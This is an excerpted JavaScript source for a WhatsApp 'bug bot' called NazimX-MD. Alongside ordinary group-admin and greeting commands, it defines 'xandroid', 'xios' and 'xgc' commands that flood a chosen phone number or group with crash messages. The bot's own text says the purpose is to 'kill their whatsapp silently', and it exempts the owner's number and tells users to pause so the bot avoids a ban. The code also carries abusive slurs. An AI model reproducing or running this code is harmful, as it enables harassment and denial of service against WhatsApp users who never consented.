...
const xtime = moment.tz('Africa/Lagos').format('HH:mm:ss')
        ...
        const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night Master 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening Master 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening Sir 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon Sir 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning Boss 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning Boss 🌄`
 } 
...
message: {
"listResponseMessage": {
title: `Decent-Nazim's ur father`
}}
}
...
senddocu(buffer)
        ...
        switch (command) {
            ...
            case 'shutdown':
                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon(`Goodbye🖐I am Decent-Nazim`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
    ...
    case 'autostatusview':{
            ...
            case 'leave':
                ...
                replygcxeon('Bye Everyone 🥺 Decent-NX')
            ...
            case 'closetime':
                ...
                setTimeout(() => {
                    ...
                    const close = `*Closed* group closed by admin Decent-Nazim\nnow only admin can send messages`
            ...
            case 'grup':
                ...
                if (args[0] === 'close') {
                    ...
                    await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcxeon(`Success In Opening The Group 🕊️ By NX`)).catch((err) => replygcxeon(json(err)))
                } else {
            ...
            case 'editinfo':
                ...
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (args[0] === 'open') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcxeon(`Successfully Opened Group Edit Info 🕊️ By NX`)).catch((err) => replygcxeon(json(err)))
                } else if (args[0] === 'close') {
                    await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcxeon(`Successfully Closed Group Edit Info🕊️ By NX`)).catch((err) => replygcxeon(json(err)))
                } else {
...
`.trim()
            ...
            case 'scriptbot':
                XeonBotInc.sendMessage(m.chat, {
                    text: `If you want the Script Click the image above 🙂 or you click on the repo link below
		    Repo:-https://github/nazimhihoo/NazimX-MD `,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
...
XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, This is my Master\n Bow before him`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
...
case "xandroid": {
  ...
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number then NX fucked these mc bc");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923701335041") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  replygcxeon("please wait, " + command + " NazimX-MD bug bot is in process.. this is the time to visite them silently and kill their whatsapp silently");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Bug Sent Successfully to @" + whatsappNumber.split('@')[0] +  
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned this message provided by Decent-Nazim.", 
    [whatsappNumber]
  );
}
break;
case "xios": {
  ...
  sendMessageWithMentions(
    "Bug Sent Successfully to @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned this message is delivered by Decent-Nazim.", 
    [whatsappNumber]
  );
}
break;
case "xios2":
  ...
  case "xgc":
  {
    ...
    try {
      ...
      await sleep(2500); // Adjusted sleep time for clarity
      replygcxeon("*DONE✅ BUG HAS BEEN SENT TO THE GROUP, NOW NX FUCKED THEESE GAYS!.*");
  ...
  sendMessageWithMentions(
    "Bug Sent Successfully to @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 5 minutes so that the bot is not banned this message is delivered by Decent-Nazim.", 
    [whatsappNumber]
  );
}
break;
...
break
            ...
            case 'help':
            case 'alive':
                let xeonmenuoh = `╭══ *❍ Nazim_X 𝕭𝖚𝖌 𝖇𝖔𝖙 ❍*
┃❁ *ᴏᴡɴᴇʀ:* Decent-Nazim
┃❁ *ᴜᴘᴛɪᴍᴇ:* ${runtime(process.uptime())}
┃❁ *User:* ${pushname}
╰┈➤ ${xeonytimewisher} 😄  ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​${readmore}
╭═══❂ 𝗔𝗡𝗗𝗥𝗢𝗜𝗗 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 ▶
┃ ❏ *xᴀɴᴅʀɪᴏᴅ [ɴᴜᴍʙᴇʀ,ᴀᴍᴏᴜɴᴛ]*
┃ ❏ *xᴀɴᴅʀɪᴏᴅ2 [ᴀᴍᴏᴜɴᴛ]*
┃ ❏ *sʏsᴛᴇᴍᴜɪᴄʀᴀsʜ [ɴᴜᴍ, ᴀᴍᴏ]*
┃ ❏ *xsʏsᴜɪ [ɴᴜᴍʙᴇʀ,ᴀᴍᴏᴜɴᴛ]*
╰══════════════════⊷
╭═══❂ 𝗜𝗢𝗦 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 ▶
┃ ❏ *xɪᴏs [ɴᴜᴍʙᴇʀ,ᴀᴍᴏᴜɴᴛ]*
┃ ❏ *xɪᴏs2*
                    ...
                    XeonBotInc.sendMessage(m.chat, {
                        ...
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl:'hhttps://files.catbox.moe/fhk2br.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
